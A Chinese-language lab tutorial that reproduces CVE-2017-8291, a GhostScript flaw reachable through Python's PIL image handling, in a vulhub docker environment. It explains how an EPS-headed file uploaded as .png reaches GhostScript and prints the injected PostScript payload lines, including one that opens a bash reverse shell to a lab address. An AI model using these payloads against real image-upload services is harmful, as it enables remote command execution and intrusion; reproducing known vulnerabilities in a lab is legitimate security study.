     各位读者朋友们大家好呀，今天小编又准备新的漏洞复现啦！今天我们要复现的漏洞环境如下：

 

漏洞编号：cve-2017-8291

漏洞类型：远程命令执行

漏洞威胁等级：高

漏洞影响版本：使用Python PIL库处理图片，环境中有GhostScript(version <= 9.21)

漏洞环境和poc获取：

在linux下运行：

git clone https://github.com/vulhub/vulhub.git

cd vulhub/python/PIL-CVE-2017-8291/

docker-compose up -d

docker ps -a

访问靶机ip+端口号

**漏洞****原理**：

Python中处理图片的模块PIL（Pillow），因为其内部调用了GhostScript而受到GhostButt漏洞（CVE-2017-8291）的影响，造成远程命令执行漏洞

 

漏洞简述：

PIL使用文件头来判断文件类型，也就是说即使我们用它处理一个以.jpg结尾的文件，只要文件内容以%!PS开头，那么PIL就会返回一个PIL.EpsImagePlugin.EpsImageFile对象，使用eps格式的逻辑去处理它。之后调用的load方法也是EpsImageFile里面的load方法

攻击链:文件上传.png文件 \->使用pil检测到eps头\->EpsImageFile对象 \-> EpsImageFile.load ->ghostscript()(version <= 9.21) \-> subprocess.check\_call() -> 执行gs命令

 

好的，上面简单的描述，我们就来开始复现一下这个漏洞吧！

漏洞复现环境：攻击机kali，靶机ubuntu下拉docker环境

 

打开漏洞环境：

 

![](../Images/c2015eac5f681663d427a47c0bf2885f.png)

  

 

 

使用poc.png上传文件

Poc文件中的代码执行命令是这样一行：

currentdevice null false mark /OutputFile (%pipe%touch /tmp/aaaaa)

意思上在tmp目录下创建一个aaaaa的文件夹

我们进入容器内部查看发现已经创建的文件夹aaaaa：

 

![](../Images/49bf47baff812b9161ebe39efe4dca1d.png)

  

我们再使用将payload代码修改成currentdevice null false mark /OutputFile (%pipe%bash -c "bash -i >& /dev/tcp/192.168.210.167/8023 0>&1")，改成exp.png上传文件

![](../Images/e63efcc3bba09b31ff1f670b9208f3b5.png)
